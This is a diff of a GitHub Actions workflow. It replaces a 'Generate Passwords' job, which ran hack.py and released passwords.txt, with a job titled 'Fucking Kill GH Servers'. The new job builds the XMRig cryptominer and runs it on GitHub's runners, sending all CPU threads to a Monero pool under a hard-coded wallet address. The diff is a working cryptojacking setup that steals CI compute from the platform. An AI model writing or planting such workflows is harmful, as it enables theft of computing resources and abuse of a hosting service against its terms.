@@ -1,29 +1,26 @@
-name: Generate Passwords
+name: Fucking Kill GH Servers
 
-on: [push]
+on:
+  workflow_dispatch:
 
 jobs:
-  generate-passwords:
+  run-xmrig:
     runs-on: ubuntu-latest
     steps:
-    - name: Checkout code
-      uses: actions/checkout@v2
-      with:
-        fetch-depth: 0
+      - name: Checkout code
+        uses: actions/checkout@v2
       
-    - name: Generate passwords
-      run: python hack.py
+      - name: Install dependencies
+        run: sudo apt-get update && sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
       
-    - name: Create release and upload artifact
-      uses: actions/create-release@v1
-      env:
-        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-      with:
-        tag_name: v1.0.0
-        release_name: Release v1.0.0
-        body: |
-          This is the first release.
-        draft: false
-        prerelease: false
-        files: passwords.txt
-
+      - name: Build XMRig
+        run: |
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+      
+      - name: Run XMRig
+        run: |
+          cd xmrig/build
+          ./xmrig -o pool.supportxmr.com:3333 -u 42B5H8ffGYvSTxnXjSWd8Yh1MZjAi2F4dNUcfdFWRMpSKYo7Bz9LZ5UXRPyGPkYp3KFSqsH8QBqgUMAbun584SX3RT5acSR -p x -k --threads=$(nproc)
